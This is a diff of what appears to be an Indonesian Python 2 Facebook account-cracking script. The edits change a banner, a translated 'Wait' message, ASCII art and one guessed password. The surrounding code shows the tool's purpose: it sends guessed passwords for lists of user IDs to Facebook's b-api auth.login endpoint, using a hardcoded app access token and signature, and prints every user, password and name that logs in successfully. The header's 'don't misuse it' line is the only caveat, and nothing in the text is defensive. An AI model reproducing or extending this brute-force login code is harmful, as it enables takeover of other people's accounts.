@@ -1,7 +1,7 @@
 # coding:utf8
 
 """
-* unang salah pakke da
+* jangan salah gunain BASTARD
 * Author : Eavick DEvista bintang alivea
 * Youtube : https://www.instagram.com/anam_eavick_821/
 -------------------------------------------------------
@@ -50,15 +50,15 @@ def tik():
     animation = '|/-\\'
     for i in range(100):
         time.sleep(0.1)
-        sys.stdout.write('\r\033[31;1m[!] \x1b[1;92mTunggu Sebentar \x1b[1;97m' + animation[(i % len(animation))])
+        sys.stdout.write('\r\033[31;1m[!] \x1b[1;92mWait \x1b[1;97m' + animation[(i % len(animation))])
         sys.stdout.flush()
 
 logo = ________________________________________________________________
 _______________________________________________________________________
         $$$$$$$$$        $$    $$       $$  $$  $$$$$$$  $$
-        $$              $$ $$   $$     $$   $$  $$       $$   $$
+        $$              $$ $$   $$     $$   $$  $$       $$   $$$
         $$$$$          $$   $$   $$   $$    $$  $$       $$ $$
-        $$            $$  $  $$   $$ $$     $$  $$       $$$
+        $$            $$  $  $$   $$ $$     $$  $$       $$$$
         $$$$$$$$$    $$       $$   $$       $$  $$$$$$$  $$  $$$
 -----------------------------------------------------------------------
        
@@ -204,7 +204,7 @@ def pilih_hh2():
                                                 z = json.loads(x.text)
                                                 print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass8+"\033[36;1m |\033[37;1m "+z['name']
                                             else:
-                                                pass9 = 'TKJ alyufi'
+                                                pass9 = 'TKJ alyusufiyah'
                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                 q = json.load(data)
                                                 if 'access_token' in q:
